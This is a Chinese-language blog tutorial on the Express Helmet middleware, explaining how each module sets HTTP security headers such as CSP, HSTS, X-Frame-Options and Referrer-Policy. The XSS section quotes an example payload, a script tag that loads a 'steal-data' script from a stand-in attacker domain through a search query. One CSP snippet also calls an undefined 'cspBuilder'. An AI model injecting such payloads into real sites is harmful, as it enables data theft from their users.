---
layout: blog
front: true
comments: True
flag: Express
background: gray
category: 后端
title: Express Helmet
date: 2019-06-06 19:04:00 GMT+0800 (CST)
background-image: /style/images/smms/node.webp
tags:
- Node
---
# {{ page.title }}

## 什么是 Helmet

[**Helmet**](https://helmetjs.github.io) 翻译为头盔，顾名思义，它的出现就是为了改善 Express 应用的安全性，具体方式是设置多种不同的 HTTP 头部信息:

```JS
const express = require('express')
const helmet = require('helmet')

const app = express()

// Helmet will set various HTTP headers to help protect your app by default
// It’s best to use Helmet early in your middleware stack so that its headers are sure to be set
app.use(helmet())

// 或者禁用指定中间件
// app.use(helmet({
//   frameguard: false
// }))
```

Helmet 属于 13 个小型中间件的集合. 运行 `app.use(helmet())` 并不会默认使用所有的中间件:

| 模块        |   默认   |
| ------------ | ------- |
| [**contentSecurityPolicy**](https://helmetjs.github.io/docs/csp/) | for setting Content Security Policy |   |
| [**dnsPrefetchControl**](https://helmetjs.github.io/docs/dns-prefetch-control) | controls browser DNS prefetching | ✓ |
| [**expectCt**](https://helmetjs.github.io/docs/expect-ct/) | for handling Certificate Transparency |   |
| [**featurePolicy**](https://helmetjs.github.io/docs/feature-policy/) | to limit your site’s features |   |
| [**frameguard**](https://helmetjs.github.io/docs/frameguard/) | to prevent clickjacking | ✓ |
| [**hidePoweredBy**](https://helmetjs.github.io/docs/hide-powered-by/) | to remove the X-Powered-By header | ✓ |
| [**hsts**](https://helmetjs.github.io/docs/hsts/) | for HTTP Strict Transport Security | ✓ |
| [**ieNoOpen**](https://helmetjs.github.io/docs/ie-no-open/) | sets X-Download-Options for IE8+ | ✓ |
| [**noCache**](https://helmetjs.github.io/docs/no-cache/) | to disable client-side caching |   |
| [**noSniff**](https://helmetjs.github.io/docs/no-sniff/) | to keep clients from sniffing the MIME type | ✓ |
| [**permittedCrossDomainPolicies**](https://helmetjs.github.io/docs/permitted-cross-domain-policies/) | for handling Adobe products’ crossdomain requests|   |
| [**referrerPolicy**](https://helmetjs.github.io/docs/referrer-policy/) | to hide the Referer header|   |
| [**xssFilter**](https://helmetjs.github.io/docs/xss-filter/) | adds some small XSS protections| ✓ |

当然我们也可以对以上中间件进行单独设置:

```JS
app.use(helmet.noCache())
app.use(helmet.frameguard())
```

下面就详细讲一下各个模块的使用，另外以下模块都支持独立引入，比如 `const csp = require('helmet-csp')`，前提是先安装哦 😯

## Content Security Policy

[**Content Security Policy(内容安全策略)**](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP) 简称 **CSP**，是通过设置请求头 `Content-Security-Policy` 来防止 XSS 攻击等，如果你的网站没有依赖任何外部字段，即自给自足型，那么请求头可以是这样:

```TEXT
<!-- only load things that are from my own domain -->
Content-Security-Policy: default-src 'self'
```

再举个栗子，如果要使用 BootStrap 的 CSS 文件，那么请求头可以是这样:

```TEXT
Content-Security-Policy: default-src 'self'; style-src 'self' maxcdn.bootstrapcdn.com
```

对应于我们代码上的设置为:

```JS
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    styleSrc: ["'self'", 'maxcdn.bootstrapcdn.com']
  }
}))
```

这里再介绍一个指令 `frame-ancestors`，可以指定有效的父级使用嵌入，如 `<iframe>`、`<embed>` 和 `<applet>` 等:

```JS
// 只能通过以下指定域名通过 iframe 等嵌入，否则会报错
frameAncestors: ['https://trusted.cn', 'https://anotherTrusted.cn']
```

> directives 更多指令配置[请查看这里](https://helmetjs.github.io/docs/csp/) 👈

如果对于一些页面要单独去设置 CSP，我们可以利用 [**Content Security Policy builder**](https://github.com/helmetjs/content-security-policy-builder) 去将上面的指令转换为请求信息里的字符串:

```JS
const builder = require('content-security-policy-builder')

// default-src 'self' default.com; script-src scripts.com; whatever-src something; object-src
const directives = {
  defaultSrc: ["'self'", 'default.com'],
  scriptSrc: 'scripts.com',
  'whatever-src': 'something',
  objectSrc: true
}

// 直接通过 setHeader 方法设置 CSP
const helmetConfigCsp = res => res.setHeader('Content-Security-Policy', cspBuilder({ directives }))
```

## DNS Prefetch Control

[**DNS prefetching**](https://developer.mozilla.org/zh-CN/docs/Controlling_DNS_prefetching) 即 **DNS 预读取**，它是一项使浏览器主动去执行域名解析的功能，其范围包括文档的所有链接。可以通过设置 `X-DNS-Prefetch-Control` 头部信息来防止该攻击。

When you visit a URL, your browser has to look up the domain’s IP address. For example, it has to resolve example.com to 93.184.216.34. This process is called DNS.

Browsers can start these DNS requests before the user even clicks a link or loads a resource from somewhere. This improves performance when the user clicks the link, but has privacy implications for users. It can appear as if a user is visiting things they aren’t visiting.

```JS
// Sets "X-DNS-Prefetch-Control: off".
app.use(dnsPrefetchControl())

// Sets "X-DNS-Prefetch-Control: off".
app.use(dnsPrefetchControl({ allow: false }))

// Sets "X-DNS-Prefetch-Control: on".
app.use(dnsPrefetchControl({ allow: true }))
```

## Frameguard

In short: Frameguard mitigates [**clickjacking attacks**](https://helmetjs.github.io/docs/frameguard/) by setting the `X-Frame-Options header`.

clickjacking attacks 总而言之就是点击劫持，诱导你点击不可见的 iframe，比如一些你并不想看到的广告啊或者什么，我们可以这样设置:

```JS
// Don't allow me to be in ANY frames.
// Sets "X-Frame-Options: DENY".
app.use(frameguard({ action: 'deny' }))

// Only let me be framed by people of the same origin.
// Sets "X-Frame-Options: SAMEORIGIN".
app.use(frameguard({ action: 'sameorigin' }))
app.use(frameguard())  // defaults to sameorigin

// Allow from a specific host.
// Sets "X-Frame-Options: ALLOW-FROM http://example.com".
app.use(frameguard({
  action: 'allow-from',
  domain: 'http://example.com'
}))
```

## Hide Powered-By

**Hide Powered-By** 可以移除 `X-Powered-By` 首部字段，其表明了用于支持当前网页应用程序的技术，显然这些信息是不要被黑客们看到的好，那么我们可以这样设置:

```JS
app.use(helmet.hidePoweredBy())
```

当然你还可以抛出一个假的技术(太坏了 😀)，大家都以为是基于 php 写的:

```JS
app.use(helmet.hidePoweredBy({ setTo: 'PHP 4.2.0' }))
```

## HSTS

In short: this module sets the `Strict-Transport-Security` header to keep your users on HTTPS.

The `Strict-Transport-Security` HTTP header tells browsers to stick with HTTPS and never visit the insecure HTTP version. Once a browser sees this header, it will only visit the site over HTTPS for the next 60 days:

```TEXT
Strict-Transport-Security: max-age=5184000
```

为了确保在访问 HTTPS 网站时不出现协议降级(回到 HTTP)的情况，我们可以这样去设置:

```JS
app.use(helmet.hsts({
  maxAge: 7776000000,
  includeSubDomains: true
}))
```

## IE No Open

In short: this middleware sets the `X-Download-Options` to prevent Internet Explorer from executing downloads in your site’s context.

简而言之，就是为了防止低版本 IE 乱打开不受信任的东西(HTML files)，我们可以这样设置:

```JS
// Sets "X-Download-Options: noopen".
app.use(helmet.ieNoOpen())
```

## No Cache

一般情况下不会去用，但是有时候为了担心旧文件有漏洞，而更新后由于浏览器缓存导致旧文件还能访问，让黑客有可趁之机，这个中间件会自动去设置 `Cache-Control`, `Surrogate-Control`, `Pragma` 和 `Expires` 等相关字段:

```JS
app.use(helmet.noCache())
```

## Don't Sniff Mimetype

In short: the Don’t Sniff Mimetype middleware, **noSniff**, helps prevent browsers from trying to guess (“sniff(嗅探)”) the MIME type, which can have security implications. It does this by setting the `X-Content-Type-Options` header to nosniff.

**MIME types** are a way of determining what kind of file you’re looking at. PNG images have the type image/png; JSON files are application/json; JavaScript files are typically text/javascript. When your browser loads a file, it reads the server’s Content-Type header to determine what the thing is.

This MIME sniffing can be an attack vector. A user could upload an image with the .jpg file extension but its contents are actually HTML. Visiting that image could cause the browser to “run” the HTML page, which could contain malicious JavaScript! Perhaps the nastiest attack is called Rosetta Flash, which allows someone to load a malicious Flash plugin instead of data

```JS
// Sets "X-Content-Type-Options: nosniff".
app.use(helmet.noSniff())
```

## Referrer Policy

In short: the [**Referrer Policy**](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referrer-Policy) module can control the behavior of the Referer header by setting the `Referrer-Policy` header:

* no-referrer - 整个 Referer 首部会被移除。访问来源信息不随着请求一起发送。
* no-referrer-when-downgrade - 默认。在同等安全级别的情况下，引用页面的地址会被发送(HTTPS -> HTTPS)，但是在降级的情况下不会被发送 (HTTPS -> HTTP)
* origin - 在任何情况下，仅发送文件的源作为引用地址。例如 `https://example.com/page.html` 会将 `https://example.com/` 作为引用地址
* origin-when-cross-origin - 对于同源的请求，会发送完整的 URL 作为引用地址，但是对于非同源请求仅发送文件的源
* same-origin - 对于同源的请求会发送引用地址，但是对于非同源请求则不发送引用地址信息
* strict-origin - 在同等安全级别的情况下，发送文件的源作为引用地址(HTTPS -> HTTPS)，但是在降级的情况下不会发送 (HTTPS -> HTTP)
* strict-origin-when-cross-origin - 对于同源的请求，会发送完整的 URL 作为引用地址；在同等安全级别的情况下，发送文件的源作为引用地址(HTTPS -> HTTPS)；在降级的情况下不发送此首部 (HTTPS -> HTTP)
* unsafe-url - 无论是同源请求还是非同源请求，都发送完整的 URL(移除参数信息之后)作为引用地址

**Referer** 是 web 浏览器设置的告诉服务器该请求的来源，同样这样会泄露信息，因此我们可以这样设置:

```JS
// Sets "Referrer-Policy: same-origin".
app.use(helmet.referrerPolicy({ policy: 'same-origin' }))

// Sets "Referrer-Policy: unsafe-url".
app.use(helmet.referrerPolicy({ policy: 'unsafe-url' }))

// Sets "Referrer-Policy: no-referrer,unsafe-url"
app.use(helmet.referrerPolicy({
  policy: ['no-referrer', 'unsafe-url']
}))

// Sets "Referrer-Policy: no-referrer".
// 注意这里的默认是 no-referrer，而不是 no-referrer-when-downgrade
app.use(helmet.referrerPolicy())
```

> 注意 Referer 实际上是单词 "referrer" 的错误拼写。Referrer-Policy 这个首部并没有延续这个错误拼写。

## XSS Filter

In short: the xssFilter middleware sets the `X-XSS-Protection` header to prevent reflected XSS attacks.

举个栗子，比如我们正常搜索某句话:

![xss-filter-ok](https://helmetjs.github.io/docs/xss-filter/xss-filter-ok.png)

当我们搜索 `<script src="http://evil.example.com/steal-data.js"></script>` 的时候，url 可能会变为: `https://goober.example.com/search?query=<script%20src="http://evil.example.com/steal-data.js"></script>`，页面会变成下面这样子，然后一个可能怀有恶意的 JS 文件就被触发了 🙀:

![xss-filter-malicious](https://helmetjs.github.io/docs/xss-filter/xss-filter-malicious.png)

```JS
// Sets "X-XSS-Protection: 1; mode=block".
app.use(helmet.xssFilter())
```

> 这个 header 可以设置三种不同的值: `0`、`1` 和 `1; mode=block`，具体区别[请参考这里](https://blog.innerht.ml/the-misunderstood-x-xss-protection/) 👈

## 参考链接

1. [Content Security Policy 入门教程](http://www.ruanyifeng.com/blog/2016/09/csp.html) By 阮一峰
2. [为你的网站带上帽子 — 使用 helmet 保护 Express 应用](https://juejin.im/post/5a24fd8f51882509e5438247) By Isvih
